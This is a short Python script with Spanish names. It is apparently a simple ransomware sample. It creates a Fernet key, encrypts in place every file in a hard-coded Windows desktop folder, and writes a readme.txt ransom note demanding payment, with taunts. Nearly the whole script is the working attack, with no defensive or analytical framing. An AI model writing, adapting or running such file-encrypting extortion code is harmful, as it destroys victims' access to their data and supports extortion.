from cryptography.fernet import Fernet
import os

def generar_llave():
    llave = Fernet.generate_key()
    with open('llave.llave', 'wb') as key_file:
        key_file.write(llave)

def retornar_llave():
    return open("llave.llave", 'rb').read()

def encriptar(items, llave):
    i = Fernet(llave)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(data)

if __name__ == '__main__':
    path = "C:\\Users\\felip\\Desktop\\Curso Angular"
    items = os.listdir(path)
    archivos = [path+"\\"+x for x in items]

generar_llave()
llave = retornar_llave()

encriptar(archivos, llave)

with open(path+"\\"+"readme.txt","w") as file:
    file.write("Todos tus archivos fueron encriptados, paga y esto se resuelve :D\n")
    file.write("Cagaste, ahora tus datos son mios\n")
    file.write("Atentamente yo")